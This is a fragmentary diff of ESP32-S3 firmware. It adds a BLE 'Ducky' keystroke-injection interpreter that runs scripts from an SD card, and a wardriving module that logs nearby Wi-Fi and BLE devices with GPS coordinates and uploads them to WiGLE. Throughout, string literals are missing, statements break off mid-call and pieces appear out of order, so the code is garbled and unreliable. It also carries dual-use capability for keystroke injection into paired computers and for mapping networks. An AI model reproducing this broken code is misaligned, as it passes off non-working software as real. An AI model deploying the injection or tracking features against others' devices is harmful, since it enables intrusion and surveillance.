+  tft.drawNumber(defaultDelay, 150, y, 2);
+  uiDrawString(
+, PADDING, y, 2);
+  uiDrawString(DEV_NAME, 150, y, 2);
+  y += rowGap;
+
+  y += 4;
+  uiSetTextFont(1);
+  uiDrawString(
+, PADDING, y, 2);
+  uiSetTextColor(bleConnected ? UI_OK : UI_WARN, COL_BG);
+  uiDrawString(bleConnected ? 
+, PADDING, y, 2);
+  uiSetTextColor(sd_mounted ? UI_OK : UI_WARN, COL_BG);
+  uiDrawString(sd_mounted ? 
+, PADDING, y, 2);
+  y += rowGap;
+
+  uiSetTextColor(COL_FG, COL_BG);
+  uiDrawString(
+, bool drawFooterBg = true) {
+  int currentY = TOOLBAR_Y;
+
+  if (type == HeaderType::IconBar) {
+    drawIconHeader();
+
+    currentY = TOOLBAR_Y;
+  }
+
+  if (type == HeaderType::TextOnly || type == HeaderType::TextWithInfo) {
+
+    tft.fillRect(0, currentY, DISPLAY_WIDTH, TEXT_HEADER_H, COL_BG);
+
+    if (type == HeaderType::TextOnly && !title.isEmpty()) {
+
+      uiSetTextColor(COL_FG, COL_BG);
+      uiSetTextFont(2);
+      uiDrawString(title, PADDING, currentY + 1, 2);
+    }
+
+    if (type == HeaderType::TextWithInfo) {
+
+      int infoY = currentY + 6;
+      uiSetTextFont(1);
+
+      uiSetTextColor(bleConnected ? UI_OK : UI_WARN, COL_BG);
+      const char* bleTxt = bleConnected ? 
+, false);
+    lastHeaderBle = bleConnected;
+    lastHeaderSd  = sd_mounted;
+  }
+}
+
+static bool listUiValid = false;
+static bool listLoadedOnce = false;
+static int  lastListCount = -1;
+static int  lastListStartItem = -1;
+static int  lastListMaxVisible = -1;
+static bool lastListHasScrollbar = false;
+static int  lastListHeaderBottom = 0;
+static int  lastListHintY = 0;
+static int  lastListTop = 0;
+static int  lastListRowStride = 0;
+static int  lastListRw = 0;
+static int  lastListRh = 0;
+
+static void calcListLayout(int& headerBottom, int& hintY, int& listTop,
+                           int& rowStride, int& maxVisibleItems,
+                           bool& hasScrollbar, int& rw, int& rh) {
+  const int barY = TOOLBAR_Y;
+  headerBottom = barY + TEXT_HEADER_H + 1;
+  rowStride = LIST_ROW_H + LIST_ROW_GAP;
+
+  const int contentBottom = DISPLAY_HEIGHT - duckyFooterReserve();
+  const int hintBandH = 18;
+  hintY = headerBottom + 6;
+  const int listAreaTop = headerBottom + hintBandH;
+  const int listAreaH = contentBottom - listAreaTop - 4;
+
+  maxVisibleItems = listAreaH / rowStride;
+  if (maxVisibleItems < 1) maxVisibleItems = 1;
+
+  const int itemCount = (int)items.size();
+  const int viewportH = maxVisibleItems * rowStride - LIST_ROW_GAP;
+  if (itemCount > 0 && itemCount < maxVisibleItems) {
+    const int blockH = itemCount * rowStride - LIST_ROW_GAP;
+    listTop = listAreaTop + (listAreaH - blockH) / 2;
+  } else {
+    listTop = listAreaTop + (listAreaH - viewportH) / 2;
+  }
+
+  hasScrollbar = (itemCount > maxVisibleItems);
+  rw = DISPLAY_WIDTH - 2*PADDING - (hasScrollbar ? 12 : 0);
+  rh = LIST_ROW_H - 2;
+}
+
+static void calcListWindow(int maxVisibleItems, int& startItem, int& endItem) {
+  startItem = max(0, sel - maxVisibleItems / 2);
+  endItem = min((int)items.size(), startItem + maxVisibleItems);
+}
+
+static void drawListHints(int hintY) {
+
+  tft.fillRect(0, hintY - 1, DISPLAY_WIDTH, 14, COL_BG);
+  if (items.empty()) return;
+
+  uiSetTextFont(1);
+  uiSetTextColor(UI_TEXT, COL_BG);
+
+  char counter[20];
+  snprintf(counter, sizeof(counter), 
+, sel + 1, (int)items.size());
+  int counterWidth = uiTextWidth(counter, 1);
+  uiDrawString(counter, DISPLAY_WIDTH - counterWidth - PADDING, hintY, 1);
+
+  uiDrawString(
+;
+
+    int descY = y;
+    int maxWidth = DISPLAY_WIDTH - 2*PADDING;
+    String remaining = desc;
+    const int bottomY = DISPLAY_HEIGHT - duckyFooterReserve() - 6;
+    while (remaining.length() > 0 && descY < bottomY) {
+      String line;
+      int consumed = wrapLineNoEllipsis(remaining, maxWidth, 1, line);
+      if (consumed <= 0) break;
+      uiDrawString(line, PADDING, descY, 1);
+      remaining = remaining.substring(consumed);
+      remaining.trim();
+      descY += 14;
+    }
+
+  }
+  if (featureHasTouchNavBar()) {
+    duckyUpdateNavLabels();
+  } else {
+    FeatureUI::layoutFooter3(
+      detailsBtns,
+      
+;
+      int sdTw = uiTextWidth(sdTxt, 1);
+      uiDrawString(sdTxt, DISPLAY_WIDTH - PADDING - sdTw, infoY, 1);
+    }
+
+    tft.drawLine(
+      0,
+      currentY + TEXT_HEADER_H,
+      DISPLAY_WIDTH,
+      currentY + TEXT_HEADER_H,
+      UI_LINE
+    );
+  }
+
+  if (drawFooterBg && type != HeaderType::IconBar && !featureHasTouchNavBar()) {
+    FeatureUI::drawFooterBg();
+  }
+}
+
+static uint32_t lastStatusPollMs = 0;
+static bool lastHeaderBle = false;
+static bool lastHeaderSd  = false;
+
+static void refreshHeaderStatusIfNeeded(bool force = false) {
+  auto showAndExitNoSD = [&](const char* title, const char* subtitle) {
+    sd_mounted = false;
+
+    tft.fillRect(0, TOOLBAR_Y - 1, DISPLAY_WIDTH, DISPLAY_HEIGHT - (TOOLBAR_Y - 1), COL_BG);
+    uiSetTextColor(UI_WARN, COL_BG);
+    uiSetTextFont(2);
+    uiDrawCentreString(title, DISPLAY_WIDTH/2, DISPLAY_HEIGHT/2 - 14, 2);
+    uiSetTextFont(1);
+    uiSetTextColor(UI_TEXT, COL_BG);
+    uiDrawCentreString(subtitle, DISPLAY_WIDTH/2, DISPLAY_HEIGHT/2 + 10, 1);
+    delay(900);
+
+    ducky_active = false;
+    feature_exit_requested = true;
+  };
+
+  static bool lastCardPresent = true;
+  const uint32_t now = millis();
+  if (force || (now - lastStatusPollMs) > 500) {
+    lastStatusPollMs = now;
+#ifdef SD_CD
+    pinMode(SD_CD, INPUT_PULLUP);
+    bool cardPresent = !digitalRead(SD_CD);
+#else
+    bool cardPresent = true;
+#endif
+
+    if (lastCardPresent && !cardPresent) {
+      showAndExitNoSD(
+;
+      uiDrawString(bleTxt, PADDING, infoY, 1);
+
+      uiSetTextColor(sd_mounted ? UI_OK : UI_WARN, COL_BG);
+      const char* sdTxt = sd_mounted ? 
+;
+    desc = fitText(desc, rw - 24, 1);
+    uiSetTextColor(UI_TEXT, body);
+    uiDrawString(desc, rx + 12, y + 26, 1);
+
+    y += rowStride;
+  }
+
+  drawListHints(hintY);
+
+  listUiValid = true;
+  lastListCount = (int)items.size();
+  lastListStartItem = startItem;
+  lastListMaxVisible = maxVisibleItems;
+  lastListHasScrollbar = hasScrollbar;
+  lastListHeaderBottom = headerBottom;
+  lastListHintY = hintY;
+  lastListTop = listTop;
+  lastListRowStride = rowStride;
+  lastListRw = rw;
+  lastListRh = rh;
+}
+
+static void updateListSelection(int newSel) {
+  if (newSel == sel) return;
+  int oldSel = sel;
+  sel = newSel;
+  clampSel();
+
+  if (!sd_mounted || items.empty() || !listUiValid) {
+    drawListPage(false);
+    return;
+  }
+
+  int headerBottom, hintY, listTop, rowStride, maxVisibleItems, rw, rh;
+  bool hasScrollbar;
+  calcListLayout(headerBottom, hintY, listTop, rowStride, maxVisibleItems, hasScrollbar, rw, rh);
+
+  int startItem, endItem;
+  calcListWindow(maxVisibleItems, startItem, endItem);
+
+  if ((int)items.size() != lastListCount ||
+      startItem != lastListStartItem ||
+      maxVisibleItems != lastListMaxVisible ||
+      hasScrollbar != lastListHasScrollbar ||
+      headerBottom != lastListHeaderBottom ||
+      hintY != lastListHintY ||
+      listTop != lastListTop ||
+      rowStride != lastListRowStride ||
+      rw != lastListRw ||
+      rh != lastListRh) {
+    drawListContentFull();
+    return;
+  }
+
+  const int rx = PADDING;
+  drawListRow(oldSel, startItem, listTop, rowStride, rx, rw, rh);
+  drawListRow(sel,    startItem, listTop, rowStride, rx, rw, rh);
+  drawListHints(hintY);
+}
+
+static void drawListPage(bool forceReload) {
+  dialog = Dialog::None;
+
+  mountSD();
+
+  drawHeader(HeaderType::IconBar);
+  drawHeader(HeaderType::TextWithInfo, 
+;
+  desc = fitText(desc, rw - 24, 1);
+  uiSetTextColor(UI_TEXT, body);
+  uiDrawString(desc, rx + 12, y + 26, 1);
+}
+
+static void drawListContentFull() {
+  const int rx = PADDING;
+
+  int headerBottom, hintY, listTop, rowStride, maxVisibleItems, rw, rh;
+  bool hasScrollbar;
+  calcListLayout(headerBottom, hintY, listTop, rowStride, maxVisibleItems, hasScrollbar, rw, rh);
+
+  tft.fillRect(0, headerBottom, DISPLAY_WIDTH, DISPLAY_HEIGHT - headerBottom - duckyFooterReserve(), COL_BG);
+
+  int startItem, endItem;
+  calcListWindow(maxVisibleItems, startItem, endItem);
+
+  drawListScrollbar(listTop, rowStride, maxVisibleItems, startItem);
+
+  int y = listTop;
+  for (int i = startItem; i < endItem; ++i) {
+    bool selected = (i == sel);
+    uint16_t body = selected ? COL_ROWSEL : COL_BG;
+    uint16_t border = selected ? COL_ACCENT : UI_LINE;
+
+    tft.fillRoundRect(rx, y, rw, rh, 6, body);
+    tft.drawRoundRect(rx, y, rw, rh, 6, border);
+    if (selected) {
+      tft.fillTriangle(rx - 6, y + rh/2 - 4, rx - 6, y + rh/2 + 4, rx - 2, y + rh/2, COL_ACCENT);
+    }
+
+    uiSetTextColor(COL_FG, body);
+    uiSetTextFont(2);
+    String name = fitText(items[i].name, rw - 40, 2);
+    uiDrawString(name, rx + 12, y + 6, 2);
+
+    uint32_t kb = (items[i].size + 1023) / 1024;
+    char sbuf[16];
+    snprintf(sbuf, sizeof(sbuf), 
+;
+  if (!bleConnected) { lastError=
+;   return false; }
+  File f = SD.open(path, FILE_READ); if(!f){ lastError=
+; return false; }
+
+  defaultDelay = 0; uint32_t interDelay = 0;
+
+  const int execTop = TOOLBAR_Y + HEADER_H + HEADER_H + 1;
+  tft.fillRect(0, execTop, DISPLAY_WIDTH, DISPLAY_HEIGHT - execTop, COL_BG);
+  uiSetTextColor(COL_FG, COL_BG);
+  uiDrawCentreString(
+; return false; }
+    uint8_t usage=0,dummy=0; if(!resolveKeyWord(tokens[i],usage,dummy)){ err=String(
+; return false; }
+  if (!mountSD())    { lastError=
+;}} else t+=ch;} if(t.length()) tokens.push_back(t); }
+    i=0; uint8_t mods=modsFromTokens(tokens,i);
+    if(i>=tokens.size()){ err=
+;}} else tmp+=c;} if(tmp.length()) tok.push_back(tmp); }
+  if(tok.empty()) return true;
+
+  String cmd=tok[0]; String rest=line.substring(cmd.length()); rest.trim();
+  String ucmd=cmd; ucmd.toUpperCase();
+
+  if(ucmd==
+ESP32S3 Ducky
+REM
+Touchscreen.h
+\r
+icon.h
+shared.h
+utils.h
+||
+     (ucmd.length()==2&&ucmd[0]=='F'&&isDigit(ucmd[1]))||
+     (ucmd.length()==3&&ucmd[0]=='F'&&isDigit(ucmd[1])&&isDigit(ucmd[2]))){
+    uint8_t usage=0,m=0; if(!resolveKeyWord(ucmd,usage,m)){ err=String(
+||
+     ucmd==
+||k==
+||t==
+||ucmd==
+
+=== gps.cpp ===
+
+#endif
+
+static void wardTrimEnd(char* s) {
+  if (!s) {
+    return;
+  }
+  size_t n = strlen(s);
+  while (n > 0 && (s[n - 1] == '\r' || s[n - 1] == '\n' || s[n - 1] == ' ' || s[n - 1] == '\t')) {
+    s[--n] = '\0';
+  }
+}
+
+
+static char s_wigUser[96];
+static char s_wigTok[160];
+static char s_wigSsid[80];
+static char s_wigPass[80];
+static bool s_wigUseSavedWifi = false;
+static bool s_wigleCfgDirty = true;
+
+static void wardWigleSanitizeOneLine(char* s) {
+  if (!s) {
+    return;
+  }
+  for (char* p = s; *p; ++p) {
+    if (*p == '\r' || *p == '\n') {
+      *p = ' ';
+    }
+  }
+}
+
+static void wardWigleLoadEditBuffers() {
+  memset(s_wigUser, 0, sizeof(s_wigUser));
+  memset(s_wigTok, 0, sizeof(s_wigTok));
+  memset(s_wigSsid, 0, sizeof(s_wigSsid));
+  memset(s_wigPass, 0, sizeof(s_wigPass));
+  s_wigUseSavedWifi = false;
+  File f = SD.open(WARD_WIGLE_CFG_PATH, FILE_READ);
+  if (!f) {
+    s_wigleCfgDirty = true;
+    return;
+  }
+  auto rdLine = [&](char* buf, size_t cap) {
+    if (!f.available() || cap < 2u) {
+      buf[0] = '\0';
+      return;
+    }
+    size_t n = f.readBytesUntil('\n', buf, cap - 1);
+    buf[n] = '\0';
+    wardTrimEnd(buf);
+  };
+  auto rdDataLine = [&](char* buf, size_t cap) {
+    buf[0] = '\0';
+    while (f.available()) {
+      rdLine(buf, cap);
+      const char* p = buf;
+      while (*p == ' ' || *p == '\t') {
+        ++p;
+      }
+      if (*p == '\0') {
+        continue;
+      }
+      if (*p == '#') {
+        continue;
+      }
+      break;
+    }
+  };
+  rdDataLine(s_wigUser, sizeof(s_wigUser));
+  rdDataLine(s_wigTok, sizeof(s_wigTok));
+  rdDataLine(s_wigSsid, sizeof(s_wigSsid));
+  rdDataLine(s_wigPass, sizeof(s_wigPass));
+  f.close();
+  bool autoWifi = !s_wigSsid[0] || strcmp(s_wigSsid, 
+
+#endif
+#ifndef WARD_WIGLE_TMP_CSV
+#define WARD_WIGLE_TMP_CSV 
+ : bleName.c_str();
+    wardLogPushBleDev(namec, d.getRSSI(), mac);
+    wardPrintCsvGpsPrefix(logf, now);
+    logf.print(
+' || *p == '\\' || *p == '\r' || *p == '\n') {
+      *p = '_';
+    }
+  }
+
+  wardLogPush(
+') {
+        *w++ = '
+') {
+        ++p;
+        continue;
+      }
+      inq = !inq;
+      continue;
+    }
+    if (*p == ',' && !inq) {
+      *p = '\0';
+      fields[nf++] = start;
+      start = p + 1;
+    }
+  }
+  fields[nf++] = start;
+  return nf;
+}
+
+
+static void wardStripCsvQuotes(char* s) {
+  if (!s || !s[0]) {
+    return;
+  }
+  size_t n = strlen(s);
+  if (n >= 2u && s[0] == '
+') {
+    memmove(s, s + 1, n - 2u);
+    s[n - 2u] = '\0';
+    char* w = s;
+    for (const char* p = s; *p;) {
+      if (*p == '
+');
+  if (s) {
+    for (const char* p = s; *p; ++p) {
+      if (*p == '
+');
+}
+
+static void wardDrawPill(int x, int y, int w, int h, const char* text, uint16_t fill, uint16_t txt) {
+  const int r = h > 8 ? 4 : 2;
+  tft.fillRoundRect(x, y, w, h, r, fill);
+  uiSetTextFont(1);
+  uiSetTextDatum(MC_DATUM);
+  uiSetTextColor(txt, fill);
+  uiDrawString(text ? text : 
+(hidden)
+) + 4) {
+      uiDrawString(
+) - 4;
+    if (bgX >= textX + uiTextWidth(
+) == 0;
+  if (!autoWifi) {
+    const char* p = s_wigSsid;
+    const char* q = 
+)) {
+        s_wardRetrySession = true;
+      }
+      gpsSerial.end();
+      return;
+    }
+    fgFile = true;
+    logf.println(
+        
+)) {
+        s_wardRetrySession = true;
+      }
+      logf.close();
+      gpsSerial.end();
+      return;
+    }
+    wardLogPushf(
+)) {
+      s_wardRetrySession = true;
+    }
+    return;
+  }
+
+  
+  tft.fillScreen(FEATURE_BG);
+  drawStatusBar(readBatteryVoltage(), true, true);
+  wardLogClear();
+  wardLogPush(
+)) {
+    return true;
+  }
+  return SD.mkdir(
+)) {
+    snprintf(out, outSz, 
+);
+
+  WardPage page = WardPage::Main;
+  bool fgLog = true;
+  uint32_t linesWritten = 0;
+  uint32_t scanCount = 0;
+  uint32_t lastScanMs = 0;
+  uint32_t lastUiMs = 0;
+  char path[48] = 
+);
+              if (fgFile) {
+                logf.flush();
+              }
+              wardPerformWigleUpload(path, fgFile ? &logf : nullptr);
+              wardUiInvalidateAll();
+            }
+          } else if (bodyHit == 8) {
+            if (!isSDCardAvailable()) {
+              wardNotify(
+);
+              wardStopForegroundScanTask();
+              logf.flush();
+              logf.close();
+              fgFile = false;
+              WiFi.scanDelete();
+              gpsSerial.end();
+              wardStartBackground();
+              s_wardFgSessionForStatusBar = false;
+              drawStatusBar(readBatteryVoltage(), true);
+              drainButtons();
+              gWardSuppressBottomTouchExit = false;
+              return;
+            }
+          }
+        } else if (hit == 3) {
+          wardLogPush(
+);
+            if (fgFile) {
+              logf.flush();
+            }
+            wardPerformWigleUpload(path, fgFile ? &logf : nullptr);
+            wardUiInvalidateAll();
+          }
+        } else if (hit == 18) {
+          if (!isSDCardAvailable()) {
+            wardNotify(
+);
+            s_bgStop = true;
+            for (int w = 0; w < 200 && s_bgTask; w++) {
+              delay(15);
+            }
+            s_bgStop = false;
+            wardSetNavLabels(page, false, fgLog);
+          } else {
+            if (!fgLog) {
+              wardNotify(
+);
+            s_wigleCfgDirty = true;
+          }
+        } else if (hit == 0) {
+          wardLogPush(
+);
+            }
+          }
+        } else if (hit == 17) {
+          if (s_bgTask) {
+            wardNotify(
+);
+            } else if (!path[0]) {
+              wardNotify(
+);
+            } else {
+              wardLogPush(
+);
+            } else {
+              wardWigleLoadEditBuffers();
+              page = WardPage::WigleCfg;
+              wardSetNavLabels(page, bgOn, logOn);
+              s_wigleCfgDirty = true;
+              wardUiInvalidateAll();
+              wardLogPush(
+);
+            } else {
+              wardWigleRunFieldEditor(
+);
+          page = WardPage::Main;
+          wardSetNavLabels(page, bgOn, logOn);
+          wardUiInvalidateAll();
+        } else if (hit == 3) {
+          wardLogPush(
+);
+          page = WardPage::Settings;
+          wardSetNavLabels(page, bgOn, logOn);
+          wardUiInvalidateAll();
+        }
+      } else if (page == WardPage::Settings) {
+        if (hit >= 10) {
+          const int bodyHit = hit - 10;
+          if (bodyHit == 0) {
+            s_editRadioMode = WardRadioMode::WiFi;
+            wardLogPush(
+);
+          page = WardPage::Settings;
+          wardSetNavLabels(page, bgOn, logOn);
+          wardUiInvalidateAll();
+        } else if (hit == 3) {
+          wardWigleSaveCfgToSd();
+          wardLogPush(
+);
+          s_cfgScanMs = s_editScanMs;
+          s_cfgMaxAps = s_editMaxAps;
+          s_cfgRadioMode = (uint8_t)s_editRadioMode;
+          wardLogPushf(
+);
+          s_editScanMs = s_cfgScanMs;
+          s_editMaxAps = s_cfgMaxAps;
+          s_editRadioMode = (WardRadioMode)s_cfgRadioMode;
+          page = WardPage::Settings;
+          wardSetNavLabels(page, bgOn, logOn);
+          wardUiInvalidateAll();
+        } else if (hit == 1) {
+          if (s_bgTask) {
+            s_bgLog = !s_bgLog;
+            wardLogPush(s_bgLog ? 
+);
+          }
+          wardSetNavLabels(page, bgOn, s_bgTask ? (bool)s_bgLog : fgLog);
+        } else if (hit == 2) {
+          if (s_bgTask) {
+            wardLogPush(
+);
+          }
+        } else if (hit == 0) {
+          wardLogPush(
+);
+          } else if (!path[0]) {
+            wardNotify(
+);
+          } else if (bodyHit == 1) {
+            s_editRadioMode = WardRadioMode::Ble;
+            wardLogPush(
+);
+          } else if (bodyHit == 2) {
+            s_editRadioMode = WardRadioMode::Both;
+            wardLogPush(
+);
+          } else if (bodyHit == 3) {
+          if (s_editScanMs > 2500u) {
+            s_editScanMs -= 500u;
+              wardLogPushf(
+);
+          } else {
+            fgLog = !fgLog;
+            s_fgScanPaused = !fgLog;
+            wardLogPush(fgLog ? 
+);
+          } else {
+            wardLogPush(
+);
+          } else {
+            wardWigleLoadEditBuffers();
+            page = WardPage::WigleCfg;
+            wardSetNavLabels(page, bgOn, logOn);
+            s_wigleCfgDirty = true;
+            wardUiInvalidateAll();
+            wardLogPush(
+);
+        }
+      }
+    }
+
+    const uint32_t now = millis();
+
+    if (isNotificationVisible()) {
+      int nx = 0, ny = 0;
+      if (readTouchXYDismiss(nx, ny)) {
+        s_lastWardInputMs = millis();
+        const NotificationAction na = notificationHandleTouch(nx, ny);
+        if (na != NotificationAction::None) {
+          wardUiInvalidateAll();
+          if (page == WardPage::WigleCfg) {
+            s_wigleCfgDirty = true;
+          }
+          lastUiMs = now - (uint32_t)WARDRIVE_UI_INTERVAL_MS;
+        }
+        delay(4);
+        continue;
+      }
+    }
+
+    int hit = -1;
+    const WardNavEvt navEvt = wardPollNavButtons(page);
+    if (navEvt != WardNavEvt::None) {
+      lastUiMs = now - (uint32_t)WARDRIVE_UI_INTERVAL_MS;
+      s_lastWardInputMs = millis();
+      if (page == WardPage::Main) {
+        if (navEvt == WardNavEvt::Setup) {
+          hit = 0;
+        } else if (navEvt == WardNavEvt::LogToggle) {
+          hit = 1;
+        } else if (navEvt == WardNavEvt::Rss) {
+          hit = 2;
+        } else if (navEvt == WardNavEvt::Exit) {
+          hit = 3;
+        }
+      } else if (navEvt == WardNavEvt::Back) {
+        hit = 0;
+      } else if (navEvt == WardNavEvt::Save) {
+        hit = 3;
+      } else if (page == WardPage::Settings && navEvt == WardNavEvt::Upload) {
+        hit = 17;
+      } else if (page == WardPage::Settings && navEvt == WardNavEvt::WigleCfg) {
+        hit = 18;
+      }
+    }
+
+    if (hit < 0) {
+      if (page == WardPage::Settings) {
+        hit = wardPollSettingsCombinedHit();
+      } else if (page == WardPage::WigleCfg) {
+        hit = wardPollWigleCfgCombinedHit();
+      } else {
+        hit = wardPollToolbarHit();
+      }
+    }
+    if (hit >= 0) {
+      lastUiMs = now - (uint32_t)WARDRIVE_UI_INTERVAL_MS;
+      const bool bgOn = (s_bgTask != nullptr);
+      const bool logOn = bgOn ? (bool)s_bgLog : fgLog;
+      if (page == WardPage::WigleCfg) {
+        if (hit >= 10) {
+          const int bh = hit - 10;
+          if (bh == 0) {
+            wardWigleRunFieldEditor(
+);
+    (*linesWr)++;
+  }
+  logf.flush();
+}
+
+static void wardRunScansForMode(File& logf, uint32_t now, uint32_t* linesWr, uint32_t* scanCt) {
+  const WardRadioMode mode = (WardRadioMode)s_cfgRadioMode;
+  if (mode == WardRadioMode::WiFi || mode == WardRadioMode::Both) {
+    wardDoWifiScanLog(logf, now, linesWr, scanCt);
+  }
+  if (mode == WardRadioMode::Ble || mode == WardRadioMode::Both) {
+    wardDoBleScanLog(logf, now, linesWr, scanCt);
+  }
+}
+
+static void wardFgScanTask(void* param) {
+  File* logf = (File*)param;
+  uint32_t lines = 0;
+  uint32_t scans = 0;
+  uint32_t lastScan = millis();
+  s_fgLines = 0;
+  s_fgScans = 0;
+
+  while (!s_fgScanStop) {
+    const uint32_t now = millis();
+    if (!s_fgScanPaused && logf && (uint32_t)(now - lastScan) >= s_cfgScanMs) {
+      lastScan = now;
+      uint32_t addL = 0;
+      uint32_t oneScan = 0;
+      wardRunScansForMode(*logf, now, &addL, &oneScan);
+      lines += addL;
+      scans += oneScan;
+      s_fgLines = lines;
+      s_fgScans = scans;
+    }
+    vTaskDelay(pdMS_TO_TICKS(15));
+  }
+
+  s_fgScanTask = nullptr;
+  vTaskDelete(nullptr);
+}
+
+static bool wardStartForegroundScanTask(File& logf) {
+  if (s_fgScanTask) {
+    return true;
+  }
+  s_fgScanStop = false;
+  s_fgScanPaused = false;
+  s_fgLines = 0;
+  s_fgScans = 0;
+  BaseType_t ok = xTaskCreatePinnedToCore(wardFgScanTask, 
+);
+    WiFi.scanDelete();
+    return;
+  }
+  int cap = n;
+  if (cap > (int)s_cfgMaxAps) {
+    cap = (int)s_cfgMaxAps;
+  }
+  for (int i = 0; i < cap; ++i) {
+    const String ss = WiFi.SSID(i);
+    const char* ssidc = ss.c_str();
+    const uint8_t* bssid = WiFi.BSSID(i);
+    char mac[20];
+    if (bssid) {
+      snprintf(mac, sizeof(mac), 
+);
+    if (wardWaitStartupFailureDismiss(
+);
+    logf.flush();
+    if (!wardStartForegroundScanTask(logf)) {
+      if (wardWaitStartupFailureDismiss(
+);
+    logf.flush();
+    return;
+  }
+  int cap = n;
+  if (cap > (int)s_cfgMaxAps) {
+    cap = (int)s_cfgMaxAps;
+  }
+  for (int i = 0; i < cap; ++i) {
+    BLEAdvertisedDevice d = results.getDevice(i);
+    char mac[24];
+    snprintf(mac, sizeof(mac), 
+);
+    out.println(
+);
+    return false;
+  }
+  File out = SD.open(WARD_WIGLE_CFG_PATH, FILE_WRITE);
+  if (!out) {
+    wardNotify(
+);
+    return false;
+  }
+  if (!wardWigleEnsureConfigDir()) {
+    wardNotify(
+);
+    return false;
+  }
+  out.println(s_wigUser);
+  out.println(s_wigTok);
+  if (s_wigUseSavedWifi) {
+    out.println(
+);
+    return;
+  }
+  BLEScanResults results = scan->start(2, false);
+  (*scanCt)++;
+  const int n = results.getCount();
+  if (n <= 0) {
+    wardLogPush(
+);
+    return;
+  }
+  if (!isSDCardAvailable()) {
+    wardNotify(
+);
+    return;
+  }
+  if (!strcmp(auth, 
+);
+    return;
+  }
+  s_bgStop = false;
+  s_bgLog = true;
+  s_bgLines = 0;
+  s_bgScans = 0;
+  s_bgPath[0] = '\0';
+  BaseType_t ok = xTaskCreatePinnedToCore(wardBgTask, 
+);
+    return;
+  }
+  wardNotify(
+);
+    wardAppendCsvString(logf, namec);
+    logf.print(',');
+    logf.print(mac);
+    logf.print(',');
+    logf.print(0);
+    logf.print(',');
+    logf.print(d.getRSSI());
+    logf.print(',');
+    logf.println(
+);
+    wardAppendCsvString(logf, ssidc);
+    logf.print(',');
+    logf.print(mac);
+    logf.print(',');
+    logf.print(WiFi.channel(i));
+    logf.print(',');
+    logf.print(WiFi.RSSI(i));
+    logf.print(',');
+    logf.println(wardAuthLabel(WiFi.encryptionType(i)));
+    (*linesWr)++;
+  }
+  logf.flush();
+  WiFi.scanDelete();
+}
+
+static bool s_wardBleScanReady = false;
+
+static void wardEnsureBleScan() {
+  if (s_wardBleScanReady) {
+    return;
+  }
+  ensureBleStackReady();
+  BLEScan* s = BLEDevice::getScan();
+  if (!s) {
+    return;
+  }
+  s->setActiveScan(true);
+  s->setInterval(134);
+  s->setWindow(99);
+  s_wardBleScanReady = true;
+}
+
+static void wardDoBleScanLog(File& logf, uint32_t now, uint32_t* linesWr, uint32_t* scanCt) {
+  wardEnsureBleScan();
+  BLEScan* scan = BLEDevice::getScan();
+  if (!scan) {
+    (*scanCt)++;
+    wardLogPush(
+);
+    wardLogPush(
+);
+    }
+    if (!isnan(navAltM)) {
+      logf.printf(
+);
+    }
+}
+
+static void wardPrintCsvGpsPrefix(File& logf, uint32_t now) {
+    logf.print((unsigned long)now);
+    logf.print(',');
+    logf.print(utcStr);
+    logf.print(',');
+    logf.print(dateStr);
+    logf.print(',');
+    if (!isnan(navLat) && !isnan(navLon)) {
+      logf.printf(
+);
+    } else {
+    wardNotify(
+);
+  char err[160];
+  bool ok = wardWigleStreamUpload(up, uploadName[0] ? uploadName : 
+);
+  logf.flush();
+
+  uint32_t lines = 0;
+  uint32_t scans = 0;
+  uint32_t lastScan = 0;
+  s_bgLines = 0;
+  s_bgScans = 0;
+
+  while (!s_bgStop) {
+    feedSerial();
+    const uint32_t now = millis();
+    if (s_bgLog && (uint32_t)(now - lastScan) >= s_cfgScanMs) {
+      lastScan = now;
+      uint32_t addL = 0;
+      uint32_t oneScan = 0;
+      wardRunScansForMode(logf, now, &addL, &oneScan);
+      lines += addL;
+      scans += oneScan;
+      s_bgLines = lines;
+      s_bgScans = scans;
+    }
+    vTaskDelay(pdMS_TO_TICKS(5));
+  }
+  logf.flush();
+  logf.close();
+  WiFi.scanDelete();
+  WiFi.disconnect();
+  gpsSerial.end();
+  s_bgPath[0] = '\0';
+  s_bgTask = nullptr;
+  vTaskDelete(nullptr);
+}
+
+bool statusBarGpsIconActive() {
+  return (s_bgTask != nullptr) || s_wardFgSessionForStatusBar;
+}
+
+void stopBackgroundIfRunning() {
+  if (!s_bgTask) {
+    return;
+  }
+  s_bgStop = true;
+  for (int i = 0; i < 200; i++) {
+    delay(15);
+    if (!s_bgTask) {
+      break;
+    }
+  }
+  s_bgStop = false;
+  drawStatusBar(readBatteryVoltage(), true);
+}
+
+static void wardStartBackground() {
+  if (s_bgTask) {
+    wardNotify(
+);
+  return true;
+}
+
+static void wardDrawWigleCfgPage();
+
+static void wardWigleRunFieldEditor(const char* title, char* buf, size_t cap, uint8_t maxKbLen, bool requireNonEmpty) {
+  s_fgScanPaused = true;
+  delay(200);
+  OnScreenKeyboardConfig cfg{};
+  cfg.titleLine1 = title;
+  cfg.titleLine2 = 
+);
+  wardLogPush(
+);
+  } else if (!strcmp(auth, 
+);
+  } else {
+    out.println(s_wigSsid);
+    out.println(s_wigPass);
+  }
+  out.close();
+  wardNotify(
+);
+  } else {
+    snprintf(out, outSz, 
+);
+}
+
+static bool wardWigleSaveCfgToSd() {
+  wardWigleSanitizeOneLine(s_wigUser);
+  wardWigleSanitizeOneLine(s_wigTok);
+  wardWigleSanitizeOneLine(s_wigSsid);
+  wardWigleSanitizeOneLine(s_wigPass);
+  if (!s_wigUser[0] || !s_wigTok[0]) {
+    wardNotify(
+);
+}
+
+static int wardPollToolbarHit() {
+  int x = 0, y = 0;
+  if (!readTouchXYDismiss(x, y)) {
+    return -1;
+  }
+  const uint32_t t = millis();
+  if ((uint32_t)(t - s_lastTbMs) < 120u) {
+    return -1;
+  }
+  if (!(y > kWardIconRowY && y < kWardIconRowY + kWardIconRowH)) {
+    return -1;
+  }
+  int16_t ix[4];
+  wardToolbarIconXs(WardPage::Main, ix);
+  for (int i = 0; i < 4; i++) {
+    if (x > ix[i] && x < ix[i] + kWardIconSz) {
+      s_lastTbMs = t;
+      s_lastWardInputMs = t;
+      return i;
+    }
+  }
+  return -1;
+}
+
+static int wardPollSettingsCombinedHit() {
+  int x = 0, y = 0;
+  if (!readTouchXYDismiss(x, y)) {
+    return -1;
+  }
+  const uint32_t t = millis();
+  if ((uint32_t)(t - s_lastWardInputMs) < 120u) {
+    return -1;
+  }
+  s_lastWardInputMs = t;
+
+  if (y > kWardIconRowY && y < kWardIconRowY + kWardIconRowH) {
+    int16_t ix[4];
+    wardToolbarIconXs(WardPage::Settings, ix);
